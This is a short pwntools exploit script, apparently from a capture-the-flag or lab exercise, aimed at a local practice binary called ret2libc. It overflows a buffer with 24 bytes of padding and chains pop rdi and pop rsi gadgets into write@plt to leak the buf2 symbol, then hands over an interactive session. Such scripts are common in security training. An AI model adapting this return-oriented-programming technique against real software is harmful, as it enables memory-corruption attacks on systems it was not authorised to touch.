from pwn import *
context.log_level = "debug"
p = process("./ret2libc")
e = ELF("./ret2libc")
w_plt = e.plt["write"]
buf2 = e.symbols["buf2"]
vul = e.symbols["vul"]

# 0x0000000000400613 : pop rdi ; ret
# 0x0000000000400611 : pop rsi ; pop r15 ; ret
pop_rdi = 0x400613
pp_rsi = 0x400611
#write(1,buf2,size)
payload = "A"*24+p64(pop_rdi)+p64(1)+p64(pp_rsi)+p64(buf2)+p64(1)+p64(w_plt)
pause()
p.sendlineafter("hello",payload)
p.interactive()


